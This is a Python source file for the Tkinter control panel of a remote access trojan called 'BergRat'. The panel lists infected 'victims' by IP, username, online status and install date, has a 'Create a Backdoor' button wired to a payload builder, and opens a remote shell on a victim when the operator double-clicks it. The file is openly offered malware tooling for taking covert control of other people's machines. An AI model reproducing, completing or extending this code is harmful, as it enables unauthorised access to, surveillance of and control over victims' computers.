import tkinter as tk
import tkinter.ttk as ttk

from threading import Thread

from network import Server
from build import Builder

from remote_shell import RemoteShell

""" Main GUI Class

Description:
- It's the main gui of the program
- Show and control all the victims
"""


class GUI(tk.Frame):

    # Inherits from Tk.Frame
    def __init__(self, master, address, port, *args, **kwargs):
        # Pass the arguments to the superclass
        tk.Frame.__init__(self, master, *args, **kwargs);
        self.master = master

        # Some GUI Configurations
        self.master.resizable(False, False)
        self.master.title("BergRat")
        self.master.geometry("650x650")

        # Create a TreeView and add som columns
        self.tree = ttk.Treeview(self)
        self.tree["columns"] = ("one", "two", "three", "four")

        self.tree.heading("#0", text="ID", anchor="w")
        self.tree.column("#0", stretch=tk.YES, width=100, anchor="w")

        self.tree.column("one", width=100)
        self.tree.heading("one", text="IP")

        self.tree.column("two", width=100)
        self.tree.heading("two", text="User")

        self.tree.column("three", width=100)
        self.tree.heading("three", text="Online")

        self.tree.column("four", width=100)
        self.tree.heading("four", text="Install Date")

        # Create Ba button to create a Backdoor
        self.button = tk.Button(self, text="Create a Backdoor", command=self.create_backdoor)

        # Pack all the objects
        self.tree.pack(fill="both", expand=True)
        self.button.pack()

        # Bind the double-click in a element from TreeView
        self.tree.bind("<Double-1>", lambda event: self.double_click_tree())

        # After all widgets being packed, the master is show
        self.master.deiconify()

        # Start the network class
        self.Network = Server(address, port)

        # Start a Get-Sessions Thread
        t_get_sessions = Thread(target=self.get_sessions)
        t_get_sessions.daemon = True
        t_get_sessions.start()

    def create_backdoor(self):
        """ Method used to call the Builder """
        Builder(self.master)

    def double_click_tree(self):
        """ Function used to call the remote shell """
        # Check what item is selected from TreeView
        try:
            item = self.tree.selection()[0]
        except IndexError:
            return

        # Get the Item UID
        uid = int(self.tree.item(item, "text"))

        # Starts the remote shell
        RemoteShell(self.Network, uid, self.master, self.Network.Sessions[uid][2])

    def get_sessions(self):
        """ Function used to update the TreeView with the connected users """

        # Start the network
        self.Network.start()

        while True:
            # Creates a copy of Network.Sessions (To avoid bugs)
            for key in self.Network.Sessions.copy():
                if not self.Network.Sessions[key][5]:
                    # Add to TreeView
                    self.add_user(
                        key,
                        self.Network.Sessions[key][1],
                        self.Network.Sessions[key][2],
                        self.Network.Sessions[key][3],
                        self.Network.Sessions[key][4]
                    )
                    self.Network.Sessions[key][5] = True

    def add_user(self, uid, ip, username, online, date):
        """ Method used to add things to TreeView """
        self.tree.insert("", "end", text=uid, values=(ip, username, online, date))
